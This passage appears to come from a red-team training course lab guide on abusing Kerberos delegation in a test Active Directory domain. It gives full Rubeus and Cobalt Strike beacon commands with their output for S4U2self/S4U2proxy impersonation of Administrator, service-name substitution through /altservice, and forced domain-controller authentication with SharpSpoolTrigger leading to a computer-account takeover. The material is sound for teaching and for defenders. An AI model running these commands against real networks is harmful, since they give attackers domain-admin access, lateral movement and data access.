beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap

Rubeus first uses the principal's TGT to perform S4U2self:

[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=

describe on this ticket shows the service name is the computer's own sAMAccountName, the username is the impersonated user, and the forwardable flag is set:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=

Rubeus then takes that ticket and submits an S4U2proxy request for the SPN given in /msdsspn. The result is a usable service ticket for the impersonated user:

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGf[...snip...]ZzLTE=

The ticket is for CIFS, so use it to list the target's C$ share:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
  
[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3380
[+] Ticket successfully imported!
[+] LUID            : 0x9b6c93
 
beacon> steal_token 3380
beacon> ls \\lon-fs-1\c$

Without protocol transition

Without protocol transition, S4U2self still succeeds but the returned ticket is not forwardable — S4U2proxy will reject it. Example failure:

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION

Without protocol transition, delegation is limited to users who have already obtained a service ticket to the front-end. Captured service tickets can be fed directly into S4U2proxy to access the back-end as those users. The example below uses an HTTP service ticket for dyork@HTTP/lon-ws-1:

[*] Action: Describe Ticket

  ServiceName              :  HTTP/lon-ws-1
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  dyork (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  20/02/2025 18:58:24
  EndTime                  :  21/02/2025 04:57:43
  RenewTill                :  27/02/2025 18:57:43
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ld5jNd1Dul9W0Dw6kVAQQBSnK72PdOhk9h3z97R0CJQ=

Use Rubeus' /tgs instead of /impersonateuser:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
[*] Action: S4U

[*] Loaded a TGS for CONTOSO.COM\dyork
[*] Impersonating user 'dyork' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGL[...snip...]mcy0x

The resulting ticket grants access to CIFS on lon-fs-1 as dyork:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIGL[...snip...]mcy0x

15.4 Service Name Substitution

Service Name Substitution swaps the SPN of an obtained service ticket for a different SPN. The exploitable property: in the KDC-REP structure used by both AS-REP and TGS-REP, the Ticket's encrypted portion contains the principal and service session key — but the SPN field (sname[2]) is not encrypted, nor included in the ticket checksum.

If an adversary obtains a service ticket for, say, HTTP/PC1, they can overwrite the SPN field to CIFS/PC1. Because both services run under the same account, the ticket session key encrypts with the same key — the substituted service accepts the ticket without the KDC ever issuing a TGS-REP for it.

This is particularly useful with constrained delegation when the allowed SPN isn't directly useful for lateral movement. For example, lon-ws-1 can delegate to the TIME service on lon-dc-1:

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: time/lon-dc-1.contoso.com, time/lon-dc-1

Request a TIME service ticket and swap the service name to CIFS (or any target) using Rubeus's /altservice parameter. Works because the encrypted portion is signed by the target computer's key, not the SPN.

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=

[*] Impersonating user 'Administrator' to target SPN 'time/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'time/lon-dc-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

      doIGf[...snip...]RjLTE=
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]RjLTE=

[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2548
[+] Ticket successfully imported!

15.5 S4U2self Computer Takeover

In the unconstrained delegation lab, an automated task caused a DA (dyork) to interact with the CIFS service on lon-ws-1. The computer's TGT cache captured dyork's TGT — used to impersonate them and access the DC.

In practice, waiting for a DA to interact with the compromised host is unreliable. Seeding files (.lnk, .url, .library-ms) can harvest tickets but still require user interaction. The alternative is to target the computer account directly.

Force a computer to authenticate to your host using SpoolSample (MS-RPRN Print Spooler) or PetitPotam (MS-EFSRPC EFS). Both cause the target to initiate an NTLM/Kerberos auth that can be captured or relayed.

Monitor for tickets on lon-ws-1:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap

Force lon-dc-1 to authenticate to lon-ws-1 with SharpSystemTriggers:

beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

NdrClientCall2x64
[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6

Rubeus captures the targeted computer account's TGT:

[*] 21/02/2025 11:54:39 UTC - Found new TGT:

  User                  :  LON-DC-1$@CONTOSO.COM
  StartTime             :  21/02/2025 10:39:21
  EndTime               :  21/02/2025 20:38:58
  RenewTill             :  28/02/2025 10:38:58
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFt[...snip...]5DT00=

Injecting this TGT and attempting CIFS access fails with access denied — computer accounts don't have local admin to themselves remotely:

beacon> run klist

Cached Tickets: (1)

#0>	Client: LON-DC-1$ @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 2/21/2025 10:39:21 (local)
	End Time:   2/21/2025 20:38:58 (local)
	Renew Time: 2/28/2025 10:38:58 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ls \\lon-dc-1\c$
[-] could not open \\lon-dc-1\c$\*: 5 - ERROR_ACCESS_DENIED

The workaround uses S4U2self with the computer's TGT to obtain a service ticket impersonating an admin user — technique by Elad Shamir, implemented in Rubeus by Charlie Clark via the /self parameter:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt[...snip...]5DT00= /nowrap
[*] Action: S4U

[*] Building S4U2self request for: 'LON-DC-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/lon-dc-1'
[*] Got a TGS for 'Administrator' to 'cifs@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF/[...snip...]kYy0x

Rubeus gets an S4U2self ticket using the computer's own SamAccountName, then substitutes the target SPN via /altservice (e.g. cifs/lon-dc-1). Valid because CIFS runs as SYSTEM — same account, same encryption key.

beacon> run klist
